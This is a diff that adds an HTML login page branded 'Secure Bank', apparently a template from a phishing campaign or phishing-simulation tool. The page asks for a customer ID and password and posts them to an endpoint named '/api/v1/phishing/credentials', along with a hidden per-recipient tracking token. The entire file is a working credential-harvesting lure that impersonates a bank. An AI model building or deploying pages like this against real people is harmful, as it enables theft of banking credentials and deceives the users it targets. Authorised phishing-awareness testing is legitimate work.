@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Secure Banking Login</title>
+<style>
+body{
+background:#ECFDF5;
+font-family:Arial;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+}
+.card{
+background:white;
+padding:40px;
+width:420px;
+border-radius:12px;
+box-shadow:0 8px 24px rgba(0,0,0,.15);
+}
+.logo{
+color:#047857;
+font-size:28px;
+font-weight:bold;
+text-align:center;
+margin-bottom:20px;
+}
+input{
+width:100%;
+padding:12px;
+margin:12px 0;
+border:1px solid #CBD5E1;
+border-radius:8px;
+}
+button{
+width:100%;
+padding:12px;
+background:#047857;
+color:white;
+border:none;
+border-radius:8px;
+font-weight:bold;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+<div class="logo">
+Secure Bank
+</div>
+
+<form method="POST" action="/api/v1/phishing/credentials">
+
+<input name="username" placeholder="Customer ID"/>
+
+<input name="password" placeholder="Password" type="password"/>
+
+<input type="hidden" name="tracking_token" value="{TOKEN}"/>
+
+<button type="submit">
+Login
+</button>
+
+</form>
+
+</div>
+
+</body>
+</html>
